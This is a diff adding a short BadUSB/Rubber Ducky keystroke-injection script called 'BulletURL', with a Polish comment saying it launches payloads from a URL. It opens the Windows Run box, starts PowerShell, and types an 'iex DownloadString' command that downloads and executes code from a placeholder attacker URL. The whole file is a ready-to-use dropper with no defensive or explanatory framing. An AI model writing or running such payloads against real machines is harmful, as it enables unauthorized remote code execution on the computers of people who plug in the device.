@@ -1,0 +1,12 @@
+REM Title: BulletURL
+REM Author: 8ad3rror
+REM Info[PL]: Odpalanie ładunków z URL
+
+DELAY
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+STRING iex ((New-Object System.Net.WebClient).DownloadString('>>URL<<'))
+ENTER
